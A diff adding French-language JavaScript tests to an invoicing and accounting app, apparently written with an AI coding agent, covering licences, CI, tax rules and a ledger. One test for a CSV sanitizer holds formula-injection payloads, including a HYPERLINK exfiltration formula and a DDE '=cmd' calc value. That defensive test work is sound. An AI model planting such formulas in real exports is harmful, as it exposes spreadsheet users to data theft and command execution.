+      assert.ok(!/\.2'|\.3'|log\.\$\{/.test(corps), qui + ' : une seule rotation, vers .1');
+
+      // Et surtout : personne n'écrit dans main.log en contournant logToFile. C'est le défaut que
+      // la rotation aurait sinon : la sauvegarde du cabinet appendait directement, donc la seule
+      // écriture volumineuse de l'application échappait à la borne.
+      const ailleurs = net.split('\n')
+        .filter(l => /appendFileSync/.test(l) && /main\.log/.test(l))
+        .filter(l => !/^\s*fs\.appendFileSync\(f,/.test(l));
+      assert.strictEqual(ailleurs.length, 0,
+        qui + ' : une écriture dans main.log contourne logToFile — ' + ailleurs.join(' | '));
+    });
+  });
+
+  t('9.1.0 : le lint existe, il est branché, et il tient les deux fautes de date de la 5.2.3', () => {
+    const cfg = lireSource('eslint.config.js');
+    const pkg = JSON.parse(lireSource('package.json'));
+    assert.strictEqual(pkg.scripts.lint, 'eslint .', 'le script « lint » doit exister : sans lui la CI ne lance rien');
+    assert.ok(pkg.devDependencies.eslint, 'eslint doit être une devDependency');
+    assert.ok(pkg.engines && pkg.engines.node, 'engines.node doit fixer la version, comme la CI');
+
+    // Les trois fautes qui ont gelé l'application entière chez l'utilisateur (5.2.3). Le lint est
+    // le seul garde-fou qui les voit AVANT l'exécution : `node --check` ne dit rien, et la machine
+    // de test, en UTC, ne les reproduit jamais.
+    ['getDay', 'setDate', "NewExpression[callee.name='Date'][arguments.length>1]"].forEach(f =>
+      assert.ok(cfg.includes(f), 'la règle de date doit couvrir ' + f));
+    // Les DEUX, et surtout pas l'une OU l'autre : un « || » ici rendrait l'assertion incapable de
+    // tomber sur la sévérité, puisque le branchement suffirait à la satisfaire. C'est le piège de
+    // précédence de la 7.33.0, et je viens d'y retomber en écrivant ce test.
+    assert.ok(/DATES = \['error',/.test(cfg), 'les règles de date doivent être des ERREURS, pas des avertissements');
+    assert.ok(/'no-restricted-syntax':\s*DATES/.test(cfg), 'les règles de date doivent être branchées sur les deux périmètres');
+
+    // Aucune règle de style : un lint qui crie sur mille lignes de formatage cesse d'être lu, et
+    // emmène avec lui les dix erreurs qui comptaient.
+    ['semi', 'quotes', 'indent', 'comma-dangle', 'max-len'].forEach(r =>
+      assert.ok(!new RegExp("'" + r + "'\\s*:").test(cfg), 'règle de style interdite dans le lint : ' + r));
+
+    // La CI lance les deux, sur les deux systèmes. Windows est la plateforme que personne ne
+    // testait avant la 7.21.x, et trois défauts s'y étaient enchaînés.
+    const ci = lireSource('.github', 'workflows', 'ci.yml');
+    assert.ok(ci.includes('npm run lint') && ci.includes('npm test'), 'la CI doit lancer le lint ET les tests');
+    assert.ok(ci.includes('windows-latest') && ci.includes('ubuntu-latest'), 'la CI doit tourner sur les deux systèmes');
+    assert.ok(/fail-fast:\s*false/.test(ci), 'fail-fast: false — savoir si un test tombe des deux côtés ou d\'un seul désigne la cause');
+  });
+
+  t('9.1.0 : « Construire un essai » ne peut ni publier ni se mettre à jour ni écraser la vraie app', () => {
+    const y = lireSource('.github', 'workflows', 'essai.yml');
+    assert.ok(/workflow_dispatch:/.test(y), 'essai.yml ne doit partir qu\'à la main');
+    assert.ok(!/on:\s*\n\s*push:/.test(y), 'essai.yml ne doit pas se déclencher sur une poussée');
+    // Les trois précautions, et les trois comptent.
+    assert.ok(/--publish never/.test(y), 'un essai ne doit apparaître dans aucune release');
+    assert.ok(/appId="tn\.skancyber\.skanfact\.essai"/.test(y) && /appId="tn\.skancyber\.skanfact\.cabinet\.essai"/.test(y),
+      'appId suffixé : sinon l\'essai EST la vraie application pour le système, et la remplace');
+    assert.ok(/productName="SkanFact \(essai\)"/.test(y), 'productName suffixé : sinon l\'essai travaille sur les vraies factures');
+    // Le plus facile à oublier, parce qu'il ne se voit qu'après coup : une application d'essai qui
+    // se met à jour redevient la version publiée au premier redémarrage.
+    assert.ok((y.match(/updateBase=""/g) || []).length >= 2 && (y.match(/updateSecret=""/g) || []).length >= 2,
+      'updateBase et updateSecret doivent être VIDES dans les deux constructions');
+  });
+
+
+  t('9.1.0 : l\'index de CLAUDE.md ne renvoie nulle part où il n\'y a rien', () => {
+    // Un index qui pointe vers une section disparue est exactement le défaut que ce projet combat
+    // depuis la 7.3.0 : « une phrase affichée que rien ne tient est un bug ». Ici c'est pire, parce
+    // que c'est MOI qui le lis à chaque session, et qu'un renvoi mort me ferait chercher pour rien.
+    const md = lireSource('CLAUDE.md');
+    const i = md.indexOf('## Index thématique');
+    const j = md.indexOf('## Règles de travail');
+    assert.ok(i > 0 && j > i, 'l\'index doit exister et précéder les règles de travail');
+    const index = md.slice(i, j);
+
+    // Toutes les versions citées dans l'index — sous la forme « 7.16.0 », « Cabinet 1.0.0 »,
+    // « 9.1.0 » — doivent nommer un titre de section qui existe dans le fichier.
+    // Une section, ici, c'est un titre `##`/`###` OU une puce en gras `- **5.0.0** (…)` : les
+    // versions d'avant la 6.0.0 vivent dans la grande liste de l'audit, pas dans un titre à elles.
+    // Ma première version ne regardait que les titres et déclarait morts cinq renvois parfaitement
+    // valides — un test trop étroit accuse du code juste, ce qui est pire que pas de test.
+    const titres = md.split('\n').filter(l => /^#{2,3} /.test(l) || /^- \*\*[\d.]+(?:\.x)?\*\*/.test(l)).join('\n');
+    const citees = new Set();
+    // On ne lit QUE les tables : la prose cite des intervalles (« 9.1.0 → 10.0.0 ») qui ne
+    // désignent aucune section.
+    // Dans la colonne « Où », le POINTEUR est ce qui précède le tiret cadratin : « 7.0.1 — la
+    // description ». Une version citée dans la description (« le bug depuis la 1.6.0 ») est du
+    // texte, pas une cible — la confondre ferait échouer le test sur un index parfaitement juste.
+    index.split('\n').filter(l => l.startsWith('|')).forEach(ligne => {
+      const cellules = ligne.split('|').slice(1, -1);
+      const ou = cellules[cellules.length - 1] || '';
+      ou.split(';').forEach(part => {
+        const pointeur = part.split('—')[0];
+        (pointeur.match(/(?:Cabinet )?\d+\.\d+\.(?:\d+|x)/g) || []).forEach(v => citees.add(v));
+      });
+    });
+    assert.ok(citees.size > 20, 'un index qui cite moins de vingt sections ne sert à rien : ' + citees.size);
+    const mortes = [...citees].filter(v => !titres.includes(v));
+    assert.deepStrictEqual(mortes, [], 'l\'index renvoie vers des sections qui n\'existent pas : ' + mortes.join(', '));
+
+    // Et les commandes qu'il annonce existent dans package.json : c'est la moitié de l'index que
+    // quelqu'un tape vraiment.
+    const pkg = JSON.parse(lireSource('package.json'));
+    ['test', 'lint', 'charge'].forEach(c =>
+      assert.ok(pkg.scripts[c], 'l\'index annonce « npm run ' + c + ' » : le script n\'existe pas'));
+    const e2e = Object.keys(pkg.scripts).filter(k => k.startsWith('e2e:')).length;
+    const annonce = Number((index.match(/(\d+) parcours/) || [])[1]);
+    assert.strictEqual(annonce, e2e, `l'index annonce ${annonce} parcours e2e, il y en a ${e2e}`);
+
+    // Les documents cités existent tous sur le disque : un plan renommé laisserait un renvoi mort.
+    (index.match(/`[A-Z][A-Z-]+\.md`/g) || []).forEach(d => {
+      const nom = d.replace(/`/g, '');
+      assert.ok(require('fs').existsSync(require('path').join(__dirname, '..', nom)),
+        'l\'index cite un document qui n\'existe pas : ' + nom);
+    });
+  });
+
+
+  // ---------------------------------------------------------------- l'option Comptabilité (9.1.0)
+
+  t('9.1.0 : l\'option voyage dans la clé signée, et le doute profite au client', () => {
+    const L = require('../src/licence.js');
+    const { publicKey, privateKey } = L.generateKeys();
+    const cles = JSON.stringify({ cles: [{ kid: 'master', publicKey }] });
+    const base = { nom: 'Test SUARL', matricule: '1234567A', exp: '2030-01-01' };
+    const etat = (payload) => L.licenceState({ cles, key: L.signLicence(payload, privateKey), matricule: '1234567A', today: '2026-09-16' });
+
+    // Une clé QUI PORTE l'option l'ouvre.
+    assert.deepStrictEqual(etat({ ...base, options: ['compta'] }).options, ['compta']);
+    // Une clé sans option ne l'a pas. C'est le cas normal d'une licence vendue sans elle.
+    assert.deepStrictEqual(etat(base).options, []);
+    // Une clé d'AVANT la 9.1.0 n'a pas de champ `options` du tout : même chose, et surtout pas une
+    // erreur. Les valeurs qui ne sont pas des chaînes sont ignorées plutôt que de faire planter.
+    assert.deepStrictEqual(etat({ ...base, options: ['compta', 42, null, ''] }).options, ['compta']);
+    assert.deepStrictEqual(etat({ ...base, options: 'compta' }).options, []);
+
+    // L'essai inclut tout : c'est ce qui permet d'essayer l'option avant de l'acheter.
+    const essai = L.licenceState({ cles, matricule: '1234567A', installedAt: '2026-09-10', today: '2026-09-16' });
+    assert.strictEqual(essai.state, 'essai');
+    assert.deepStrictEqual(essai.options, L.TOUTES_OPTIONS);
+    // La FIN d'essai ne l'inclut pas : sinon l'option serait gratuite pour qui laisse filer l'essai.
+    const fin = L.licenceState({ cles, matricule: '1234567A', installedAt: '2026-01-01', today: '2026-09-16' });
+    assert.strictEqual(fin.state, 'finessai');
+    assert.deepStrictEqual(fin.options, []);
+    // Le poste de l'éditeur a tout : celui qui signe n'achète pas (8.0.0).
+    assert.deepStrictEqual(L.licenceState({ cles, editeur: true, matricule: '1234567A', today: '2026-09-16' }).options, L.TOUTES_OPTIONS);
+    // Une application désarmée n'a rien à vendre : tout est ouvert.
+    assert.deepStrictEqual(L.licenceState({ cles: '', today: '2026-09-16' }).options, L.TOUTES_OPTIONS);
+    // Une licence expirée ou révoquée perd l'option comme elle perd le reste.
+    assert.deepStrictEqual(etat({ ...base, options: ['compta'], exp: '2020-01-01' }).options, []);
+  });
+
+  t('9.1.0 : le sous-module est décoché par défaut, et ne masque rien de ce qui existe', () => {
+    // Une option payante ne s'allume pas toute seule chez quelqu'un qui ne l'a pas demandée : à
+    // l'inverse d'un module, `null` (aucun choix enregistré) vaut le DÉFAUT, pas « tout ».
+    const sm = core.sousModules();
+    assert.strictEqual(sm.length, 1, 'un seul sous-module en 9.1.0');
+    assert.strictEqual(sm[0].id, 'compta.livres');
+    assert.strictEqual(sm[0].option, 'compta');
+    assert.strictEqual(sm[0].defaut, false, 'une option payante est décochée par défaut');
+    assert.strictEqual(core.sousModuleOn({ company: {} }, 'compta.livres'), false);
+    assert.strictEqual(core.sousModuleOn({ company: { modules: null } }, 'compta.livres'), false);
+    assert.strictEqual(core.sousModuleOn({ company: { modules: ['ventes'] } }, 'compta.livres'), false);
+    assert.strictEqual(core.sousModuleOn({ company: { modules: ['ventes', 'compta.livres'] } }, 'compta.livres'), true);
+    assert.strictEqual(core.sousModuleOn({ company: {} }, 'inconnu'), false);
+
+    // Le module parent reste TOUJOURS affiché : les journaux, la TVA, les clôtures et le paquet du
+    // comptable n'ont jamais été payants et ne doivent pas le devenir.
+    const compta = core.moduleById('compta');
+    assert.strictEqual(compta.toujours, true, 'la page Comptabilité reste le cœur du métier');
+    assert.strictEqual(core.moduleOn({ company: { modules: [] } }, 'compta'), true);
+    assert.strictEqual(core.OPTION_LABELS.compta, 'Comptabilité');
+  });
+
+  t('9.1.0 : optionBlock est LA porte, posée au changement d\'onglet et nulle part ailleurs', () => {
+    const app = lireApp();
+    assert.ok(app.includes('function optionBlock('), 'optionBlock doit exister');
+
+    // Trois onglets, et seulement trois. La liste est nommée une fois : recopiée à chaque écran,
+    // le septième naîtrait sans son garde-fou.
+    const m = app.match(/const ONGLETS_OPTION = \[([^\]]*)\]/);
+    assert.ok(m, 'ONGLETS_OPTION doit être une liste nommée');
+    const onglets = m[1].split(',').map(x => x.trim().replace(/'/g, '')).filter(Boolean);
+    assert.deepStrictEqual(onglets.slice().sort(), ['balance', 'etats', 'grandlivre']);
+    // Ce qui ne doit JAMAIS y entrer : tout ce qu'une PME envoie à son comptable.
+    ['ventes', 'achats', 'tva', 'ecritures', 'calendrier', 'clotures', 'cabinet'].forEach(o =>
+      assert.ok(!onglets.includes(o), `« ${o} » ne peut pas devenir payant : c'est ce qu'on donne au comptable`));
+
+    // Un seul appel, et il est dans le gestionnaire d'onglet. Un `optionBlock` posé dans une
+    // fonction de dessin serait recopié, et les captures d'écran ne le montreraient pas.
+    const appels = (app.match(/\boptionBlock\(/g) || []).length;
+    assert.strictEqual(appels, 2, `optionBlock doit être défini une fois et appelé une fois — trouvé ${appels} occurrences`);
+    const i = app.indexOf("$$('#c-tabs button[data-tab]').forEach(b => b.onclick");
+    assert.ok(i > 0 && app.slice(i, i + 700).includes('optionBlock('), 'la porte vit dans le gestionnaire d\'onglet');
+
+    // Et elle ne prend rien en otage : la fenêtre dit ce qui reste disponible.
+    const j = app.indexOf('function optionBlock(');
+    const corps = app.slice(j, app.indexOf('\n  function licenceBlock', j));
+    assert.ok(/paquet de ton comptable restent disponibles/.test(corps), 'la fenêtre doit dire ce qui reste ouvert');
+    assert.ok(/go-opt/.test(corps), 'elle doit mener à la licence');
+  });
+
+  t('9.1.0 : « Émettre » ne peut pas donner deux numéros', () => {
+    // F-9.1.0-25. Le geste est asynchrone (`await confirmDialog`) : deux clics rapides donnaient
+    // DEUX passages dans `issue()`, donc deux `nextNumber` — la pièce prenait un numéro, puis le
+    // suivant, et le premier restait en trou. Trouvé en relisant le cahier, jamais par un test.
+    const app = lireApp();
+    const i = app.indexOf('    function issue() {');
+    assert.ok(i > 0, 'issue() introuvable');
+    const entete = app.slice(i, i + 200);
+    // Les DEUX moitiés : l'état (après un rechargement) et le drapeau (pendant le geste).
+    assert.ok(/emissionEnCours/.test(entete), 'issue() doit refuser pendant le geste');
+    assert.ok(/isIssued\(\)/.test(entete), 'issue() doit refuser une pièce déjà émise');
+    assert.ok(app.includes('const isIssued = () =>'), 'isIssued doit exister');
+
+    // Et le bouton le DIT : `data-busy` + `disabled`. Un bouton qui refuse en silence fait
+    // recliquer, ce qui est exactement le geste qu'on cherche à empêcher.
+    const j = app.indexOf("if ($('#issue')) $('#issue').onclick");
+    const geste = app.slice(j, j + 1400);
+    assert.ok(/dataset\.busy/.test(geste) && /disabled = true/.test(geste), 'le bouton doit se désactiver visiblement');
+    assert.ok(/finally/.test(geste), 'il doit se réactiver quoi qu\'il arrive : un bouton mort après une annulation est pire');
+    // La poignée se relit APRÈS l'attente : la page a pu se redessiner (règle 7.6.0).
+    assert.ok(/const encore = \$\('#issue'\)/.test(geste), 'le bouton se relit après l\'attente');
+  });
+
+  // ---------------------------------------------------------------- 9.1.1 — les corrections fiscales
+
+  t('9.1.1 : un client exonéré décoche le timbre à la CRÉATION, jamais à l\'affichage', () => {
+    // TEST-9.1.1-001/002. La tentation était de lire `client.stampExempt` dans `computeTotals` :
+    // une ligne, et tout marche. Sauf que déclarer un client exonéré six mois plus tard
+    // réécrirait le total de chaque facture déjà émise, envoyée et déclarée — le défaut de la
+    // 7.1.1 sur le timbre, refait un cran plus haut. L'exonération se COPIE sur la pièce.
+    const co = { ...core.DEFAULT_DATA.company, stampFee: 1, currency: 'DT' };
+    const lignes = [{ label: 'Prestation', qty: 1, unitPrice: 1000, vatRate: 0 }];
+    assert.strictEqual(core.computeTotals({ type: 'facture', lines: lignes }, co).stamp, 1);
+    assert.strictEqual(core.computeTotals({ type: 'facture', lines: lignes, applyStamp: false }, co).stamp, 0);
+    // Un avoir ou une proforma n'en portent jamais tant qu'on ne le demande pas : y poser
+    // `applyStamp = true` au nom d'un client NON exonéré en ajouterait un là où il n'y en a pas.
+    ['avoir', 'proforma'].forEach(t => {
+      assert.strictEqual(core.computeTotals({ type: t, lines: lignes }, co).stamp, 0);
+      assert.strictEqual(core.computeTotals({ type: t, lines: lignes, applyStamp: false }, co).stamp, 0);
+    });
+    // Et rien dans le calcul ne va chercher le client : c'est ce qui rend la pièce émise stable.
+    const src = lireSource('src', 'renderer', 'core.js');
+    const zone = src.slice(src.indexOf('const stampApplies'), src.indexOf('const totalTTC'));
+    assert.ok(zone.length > 200 && zone.length < 3000, `tranche du timbre suspecte : ${zone.length}`);
+    assert.ok(!/stampExempt|clientById|clients/.test(zone),
+      'computeTotals ne doit JAMAIS relire le client : une pièce émise ne bouge plus');
+
+    // Côté écran, la copie se fait dans les DEUX sens et seulement sur une facture.
+    const app = lireApp();
+    const acd = app.slice(app.indexOf('function applyClientDefaults'), app.indexOf('function clientWithholding'));
+    assert.ok(acd.length > 100, 'applyClientDefaults introuvable');
+    assert.ok(/doc\.type === 'facture'\) doc\.applyStamp = !c\.stampExempt/.test(acd),
+      'l\'exonération doit se poser ET se retirer, et seulement sur une facture');
+    // Et l'écran suit : sans ça, le prochain `formValues` relit la case restée en arrière.
+    assert.ok(/caseTimbre[\s\S]{0,200}?checked = doc\.applyStamp !== false/.test(app),
+      'la case du timbre ne suit pas le changement de client');
+    assert.ok(/name="stampExempt"/.test(app), 'la case n\'est pas sur la fiche client');
+  });
+
+  t('9.1.1 : le seuil de retenue vaut 0, 0 ne prévient jamais, et sous le seuil on AVERTIT', () => {
+    // TEST-9.1.1-003/004/005. La valeur par défaut d'une règle qu'on ne connaît pas est celle qui
+    // ne fait rien : deux relectures extérieures proposaient « par défaut 1 000 DT ». Ce serait
+    // écrire une règle de droit que personne n'a confirmée.
+    assert.strictEqual(core.seuilRetenue({}), 0);
+    assert.strictEqual(core.seuilRetenue(), 0);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: '' }), 0);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: 1000 }), 1000);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: '1500,5' }), 0, 'une saisie illisible ne fabrique pas un seuil');
+    // Le SEUL cas que la garde protège vraiment : `Number('') === 0` rend l'assertion évidente
+    // inutile, et 0 est déjà la valeur neutre (leçon de la 8.3.0).
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: -1000 }), 0, 'un seuil négatif est ignoré');
+
+    // L'avertissement AVERTIT : il vit dans `issueWarnings`, jamais dans `issue()` ni dans
+    // `validate()`. Un refus empêcherait d'émettre une facture parfaitement légale.
+    const app = lireApp();
+    // `lireApp()` RETIRE les commentaires de ligne : une tranche ne peut jamais s'ancrer sur un
+    // commentaire, seulement sur du code (piège de la 8.2.0, re-rencontré).
+    const iw = app.slice(app.indexOf('function issueWarnings()'), app.indexOf('async function premierEnvoiOk()'));
+    assert.ok(iw.length > 500 && iw.length < 6000, `tranche d'issueWarnings suspecte : ${iw.length}`);
+    assert.ok(/C\.seuilRetenue\(co\)/.test(iw) && /seuil > 0/.test(iw),
+      'l\'avertissement du seuil doit vivre dans issueWarnings');
+    assert.ok(/w\.push\(`Cette facture/.test(iw), 'il doit AVERTIR (w.push), pas refuser');
+    assert.ok(!/return false|refus\(/.test(iw), 'issueWarnings ne refuse rien, jamais');
+    // Et nulle part ailleurs : c'est ce qui garantit qu'il ne devient pas un blocage en passant.
+    assert.strictEqual((app.match(/seuilRetenue/g) || []).length, 1,
+      'le seuil ne se lit qu\'à un seul endroit de l\'interface');
+  });
+
+  t('9.1.1 : la TFP est PROPOSÉE par le métier, jamais écrite sans le comptable', () => {
+    // TEST-9.1.1-006/007. Le test est écrit pour TOMBER si quelqu'un ajoute un `tfp:` à ACTIVITIES
+    // sans avoir la réponse. C'est un chiffre qui part sur les bulletins de salariés réels.
+    core.ACTIVITIES.forEach(a => {
+      assert.strictEqual(a.tfp, undefined,
+        `« ${a.label} » porte une TFP en dur : aucun métier n'en a une tant que le comptable n'a pas tranché`);
+      assert.strictEqual(core.tfpSuggere(a.id), null);
+    });
+    assert.strictEqual(core.tfpSuggere('informatique'), null);
+    assert.strictEqual(core.tfpSuggere('metier-qui-n-existe-pas'), null);
+    assert.strictEqual(core.tfpSuggere(), null);
+
+    // Le mécanisme, lui, existe et se prouve sur un métier fabriqué pour le test.
+    const faux = { id: '__essai__', label: 'Essai', catalog: [], tfp: 1 };
+    core.ACTIVITIES.push(faux);
+    try {
+      assert.strictEqual(core.tfpSuggere('__essai__'), 1);
+      const d = { company: { activity: '__essai__' }, payrollSettings: {} };
+      assert.strictEqual(core.payrollSettings(d).tfpRate, 1, 'la proposition doit s\'appliquer');
+      // Et elle n'écrase JAMAIS un choix : ni un taux saisi, ni un champ touché.
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpRate: 2 } }).tfpRate, 2);
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpTouche: true } }).tfpRate,
+        core.DEFAULT_PAYROLL.tfpRate, 'un champ touché reprend la valeur livrée, pas la proposition');
+      // `0` est un taux légitime : un `||` le remplacerait par la proposition.
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpRate: 0 } }).tfpRate, 0);
+    } finally { core.ACTIVITIES.pop(); }
+
+    // Enregistrer les barèmes, c'est avoir décidé (motif `regimeTouche`, 7.25.0/7.30.0).
+    const app = lireApp();
+    assert.ok(/brackets: b, tfpTouche: true/.test(app),
+      'enregistrer les barèmes doit poser tfpTouche, sinon la proposition revient écraser le taux');
+    assert.ok(/const tfpPropose = C\.tfpSuggere\(company\(\)\.activity\)/.test(app), 'l\'écran ne lit pas la proposition');
+    assert.ok(/tfpPropose !== null \?/.test(app), 'la mention doit disparaître quand il n\'y a rien à proposer');
+  });
+
+  t('9.1.1 : les deux nouvelles bulles existent, et le contrôle e-facture est écrit', () => {
+    // TEST-9.1.1-008/009. Un champ neuf sans bulle est un champ que personne ne comprend — et ici
+    // les deux portent un « À VÉRIFIER », parce que ce sont des règles de droit.
+    const guide = lireSource('src', 'renderer', 'guide.js');
+    ['client.stampExempt', 'doc.withholdingThreshold'].forEach(k => {
+      assert.ok(guide.includes(`'${k}':`), `la bulle ${k} manque`);
+    });
+    const bulles = require('../src/renderer/guide.js').INFO;
+    ['client.stampExempt', 'doc.withholdingThreshold'].forEach(k => {
+      assert.ok(/VÉRIFIER/.test(bulles[k].d), `la bulle ${k} doit porter son « À VÉRIFIER »`);
+    });
+
+    // Le contrôle e-facture est un DOCUMENT, pas du code : il dit, champ par champ, si notre
+    // modèle porte ce qu'un format officiel exigerait. C'est ce qui permettra de décider si
+    // l'export TEIF est un chantier d'une semaine ou de trois mois, le jour où l'obligation
+    // tombera — au lieu de le découvrir ce jour-là.
+    const doc = fs.readFileSync(path.join(__dirname, '..', 'docs', 'e-facture-controle.md'), 'utf8');
+    assert.ok(doc.length > 3000, 'le contrôle e-facture est trop court pour dire quoi que ce soit');
+    const lignes = doc.split('\n').filter(l => /^\|/.test(l) && /\|\s*(oui|non|partiel)\b/i.test(l));
+    assert.ok(lignes.length >= 25, `seulement ${lignes.length} champ(s) contrôlé(s)`);
+    assert.ok(/À VÉRIFIER/.test(doc), 'un document sur un format officiel qu\'on n\'a pas lu porte son « À VÉRIFIER »');
+  });
+
+  t('9.1.1 : une formule CSV est neutralisée, et aucun montant ne bouge', () => {
+    // TEST-9.1.1-010. Un tableur EXÉCUTE une cellule qui commence par `=`, `+`, `-` ou `@`. Nos
+    // exports partent chez le comptable, et leurs libellés viennent de qui tape la facture :
+    // `=HYPERLINK("http://x?"&A1)` dans un libellé faisait partir le contenu de sa balance vers
+    // une adresse choisie par quelqu'un d'autre, sans que rien ne plante.
+    const Compta = require('../src/renderer/compta.js');
+    const cab = require('../src/cabinet/cabcore.js');
+    // La parade est STRICTE : elle ne devine pas ce qui « ressemble à un nombre ». C'est
+    // l'appelant qui sait — `core.toCsv` a des types de colonnes, le cabinet non. Sans cette
+    // séparation, `+216 71 123 456` (un téléphone) passerait pour un montant et ressortirait
+    // évalué en `#NOM?` : aucune règle ne distingue un téléphone d'un montant.
+    const cases = [
+      ['=1+1', true], ['=HYPERLINK("http://x")', true], ['+216 71 123 456', true],
+      ['@SUM(A1:A9)', true], ['\t=cmd', true], ['\r=cmd', true],
+      ['-Alpha SARL', true], ['-DUPONT', true], ['-12,500', true],
+      ['Alpha SARL', false], ['', false], ['Devis n° 12', false], ['1234', false]
+    ];
+    cases.forEach(([v, attendu]) => {
+      assert.strictEqual(Compta.csvDangereux(v), attendu, `csvDangereux(${JSON.stringify(v)})`);
+      assert.strictEqual(cab.csvDangereux(v), attendu, `cabcore.csvDangereux(${JSON.stringify(v)})`);
+    });
+
+    // Par le vrai chemin des deux applications, pas seulement par la fonction.
+    const csv = core.toCsv(
+      [{ nom: '=cmd|\' /C calc\'!A0', mt: -12.5, d: '2026-03-04', note: '-Alpha' }],
+      [{ key: 'nom', label: 'Client' }, { key: 'mt', label: 'Montant', type: 'money' },
+       { key: 'd', label: 'Date', type: 'date' }, { key: 'note', label: 'Note' }]);
+    const ligne = csv.split('\r\n')[1];
+    assert.ok(ligne.includes('\'=cmd'), 'la formule doit être préfixée : ' + ligne);
+    assert.ok(ligne.includes('-12,500'), 'un montant négatif reste un montant : ' + ligne);
+    assert.ok(ligne.includes('04/03/2026'), 'une date n\'est jamais touchée : ' + ligne);
+    assert.ok(ligne.includes(';\'-Alpha'), 'un nom qui commence par un tiret passe par la parade : ' + ligne);
+
+    // Et l'exception numérique du cabinet, qui n'existe QUE là : ses cellules arrivent déjà mises
+    // en forme et il n'a aucun type pour dire lesquelles sont des montants. Un `-12,500` préfixé,
+    // c'est une colonne que le comptable ne peut plus additionner.
+    assert.strictEqual(cab.toCsvLine(['=1+1', '-12,500', '+1 200,000', 'Alpha']),
+      '\'=1+1;-12,500;+1 200,000;Alpha');
+
+    // Les DEUX corps, au caractère près : cabcore ne charge pas compta.js (il est requis par
+    // main.js, par le renderer et par les tests). Deux parades qui divergent, c'est celle qu'on a
+    // oubliée qui laisse passer. Même règle que `round3` en 9.1.0.
+    const corps = src => (src.match(/function csvDangereux\(cellule\) \{[\s\S]*?\n  \}/) || [''])[0];
+    const a = corps(lireSource('src', 'renderer', 'compta.js'));
+    const b = corps(lireSource('src', 'cabinet', 'cabcore.js'));
+    assert.ok(a && a === b, `csvDangereux diverge :\n  compta  : ${a}\n  cabcore : ${b}`);
+
+    // Et le quatrième export — le portefeuille du cabinet — ne doit plus avoir sa propre version.
+    const cabapp = lireSource('src', 'cabinet', 'renderer', 'app.js');
+    const zone = cabapp.slice(cabapp.indexOf('function toCsv(cols, rows)'), cabapp.indexOf('function toCsv(cols, rows)') + 400);
+    assert.ok(zone.length > 100, 'toCsv du cabinet introuvable');
+    assert.ok(/K\.toCsvLine/.test(zone), 'l\'export du portefeuille doit passer par la porte unique');
+    assert.ok(!/replace\(\/"\/g/.test(zone), 'il ne doit plus échapper lui-même : c\'est la version sans parade');
+  });
+
+  // ---------------------------------------------------------------- 9.2.0 — le livre du dossier
+
+  const KL = require('../src/renderer/compta.js');
+  // Un livre de démonstration, fabriqué à la main : quatre pièces, de quoi éprouver les invariants.
+  const faitLivre = () => {
+    const l = KL.livreVide('MAT:1234567A', 2026);
+    const v = (date, piece, ht, docId) => KL.ajouterEcriture(l, {
+      date, journal: 'VT', piece, libelle: 'Facture ' + piece, source: 'skanfact', docId,
+      lignes: [
+        { compte: '411001', tiersId: 'c1', libelle: 'Client Test', debit: KL.round3(ht * 1.19) },
+        { compte: '706', libelle: 'Prestation', credit: ht },
+        { compte: '4367', libelle: 'TVA collectée', credit: KL.round3(ht * 0.19) }
+      ]
+    }, 'import', 1000);
+    return { l, v };
+  };
+
+  t('9.2.0 : le livre est FIGÉ — une version inconnue ne se réécrit jamais', () => {
+    const l = KL.livreVide('MAT:1', 2026);
+    assert.strictEqual(l.format, 1);
+    assert.ok(KL.isValidLivre(l));
+    // Les trois listes de 9.5.0 / 9.6.0 / 9.7.0 existent VIDES dès maintenant : leur forme ne
+    // bouge plus, parce qu'un relevé « par ligne » ne se transforme pas en relevé « par compte »
+    // une fois écrit chez soixante clients.
+    ['releves', 'immobilisations', 'declarations'].forEach(k =>
+      assert.deepStrictEqual(l[k], [], `${k} doit exister, vide`));
+    assert.deepStrictEqual(l.ouverture, { date: null, source: null, lignes: [] });
+    // Un exercice décalé est permis ; `du > au` ne l'est pas.
+    assert.ok(KL.isValidLivre(KL.livreVide('MAT:1', 2026, { du: '2026-07-01', au: '2027-06-30' })));
+    assert.ok(!KL.isValidLivre({ ...l, exercice: { ...l.exercice, du: '2026-12-31', au: '2026-01-01' } }));
+    ['plan', 'journaux', 'ecritures', 'lettrages', 'audit'].forEach(k =>
+      assert.ok(!KL.isValidLivre({ ...l, [k]: null }), `${k} manquant doit être refusé`));
+    // Une version SUPÉRIEURE se reconnaît à part : l'ouvrir et la réécrire avec nos règles à nous
+    // perdrait ce qu'une version plus récente y avait mis.
+    assert.ok(!KL.isValidLivre({ ...l, format: 2 }));
+    assert.ok(KL.livreVersionInconnue({ ...l, format: 2 }));
+    assert.ok(!KL.livreVersionInconnue({ ...l, format: 1 }));
+    assert.ok(!KL.livreVersionInconnue({ pas: 'un livre' }));
+  });
+
+  t('9.2.0 : le numéro naît à la VALIDATION, jamais au brouillard, et ne troue pas', () => {
+    const { l, v } = faitLivre();
+    const a = v('2026-03-04', 'FAC-2026-001', 1000, 'd1');
+    const b = v('2026-01-15', 'FAC-2026-002', 500, 'd2');
+    assert.strictEqual(a.numero, null, 'un brouillard n\'a pas de numéro');
+    assert.strictEqual(a.statut, 'brouillard');
+
+    // Une écriture FAUSSE est refusée AVANT que le numéro soit consommé — sinon chaque refus
+    // trouerait la numérotation (le défaut de `nextNumber` trouvé en 6.0.0).
+    const faux = KL.ajouterEcriture(l, { date: '2026-03-04', journal: 'OD', piece: 'X', lignes: [{ compte: '613', debit: 100 }, { compte: '401', credit: 90 }] }, 'moi', 1);
+    const r = KL.validerEcriture(l, faux.id, 'moi', 2);
+    assert.strictEqual(r.ok, false);
+    assert.ok(/ne tombe pas juste/.test(r.motif), r.motif);
+    assert.strictEqual(faux.numero, null, 'un refus ne doit jamais consommer un numéro');
+
+    // L'ordre est celui de la VALIDATION, pas celui des dates : b est daté avant a et validé après.
+    assert.ok(KL.validerEcriture(l, a.id, 'moi', 3).ok);
+    assert.ok(KL.validerEcriture(l, b.id, 'moi', 4).ok);
+    assert.strictEqual(a.numero, 1);
+    assert.strictEqual(b.numero, 2, 'le numéro suit la validation, pas la date');
